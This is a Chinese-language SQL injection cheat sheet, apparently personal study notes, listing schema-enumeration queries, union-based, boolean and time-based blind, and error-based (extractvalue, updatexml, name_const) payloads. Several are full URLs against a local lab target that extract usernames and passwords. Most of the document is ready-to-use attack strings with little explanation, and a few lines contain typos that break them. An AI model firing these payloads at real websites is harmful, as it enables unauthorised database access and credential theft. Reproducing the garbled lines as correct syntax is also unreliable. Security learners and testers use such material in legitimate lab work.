# SQL注入    
sql注入是搞安全最开始接触到基础漏洞类型吧。  
这篇文章主要包含SQL注入的分类以及实战当中经常使用到的cheatsheet以及一些sql注入的tricky    


## SQL注入cheatsheet 


### 查询数据库基本数据  

#### 查询数据库
```
select schema_name from information_schema.schemata ;
```
show databaes;
#### 查询数据表
```
select table_name from information_schema.tables where table_schema="" ;
```
#### 查询表当中的列 

```
select column_name from information_schea.columns where table_name="";
```

#### union 注入  
union注入最好选择将注入语句放在最后 
```
index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23

index.php?id=1' union select 1,2,table_name from information_schema.tables where table_schema= 0x7365637572697479 %23
```





### 注入技巧  
#### 十六进制编码  
**进行注入的时候使用 "" 比较少见 一般是将其转换为 0x 的十六进制形式** 
在mysql当中都可以通用十六进制来进行
```
select concat_ws(0x23,version(),2);
```  
#### base64编码   
```
select convert_from(decode(‘vasndjcn==’,’base64’),’utf-8’)
select chr(num1) || chr(num2) || chr(num3) 只能使用select insert delete
```


### 数据库的连接函数   
几种常见的数据连接函数  
1. concat(str1,str2,...)——没有分隔符地连接字符串
2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据    


### 布尔注入   
通过精心构造的语句进行拼接，从而产生真或者假的返回值最后得到返回结果   
#### select case when
```
select case when {判断语句} then sleep(3) else 1 end;
select case when (ascii(substr((select version()),1,1))=58) then sleep(3) else end;  
select case When ascii(substr(concat(user,password),1,1))>53 THEN 1 else 0 end from users limit 0,1;  
```  


#### and if  
```
admin') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=114,1,0) #

admin') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,0); #
```  

#### and  
```
1' and ascii(substr((select version()),1,1))=53#
1' and ascii(substr(databse(),1,1))<109 #
```

### 报错注入  
通过sql注入当中存在的一些函数，在故意造成错误的情况下会将精心构造的函数进行执行从而造成数据的泄露或者代码的执行  
#### extractvalue

extracvalue从目标的XML文件当中查询的字符串 

```
extractvalue(1,concat(0x7e,(select @@version),0x7e))

http://192.168.233.140:83/Less-5/?id=1%27%20and%20extractvalue(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e))--+
```
#### updatexml

```
updatexml(1,concat(0x7e,(select @@version),0x7e),1)

http://192.168.233.140:83/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20concat(username,password)%20from%20security.users%20limit%201,1),0x7e),1)--+
```
updatexml的本意是更新xpath文档当中的字符串，我们的xpath_string写错的时候就会出现错误 
#### name_const

感觉平时使用的比较少 
```
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
http://192.168.233.140:83/Less-5/?id=1%27%20and%20select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+
```







## referer
[部分payload的来源](https://www.freebuf.com/articles/web/175049.html)
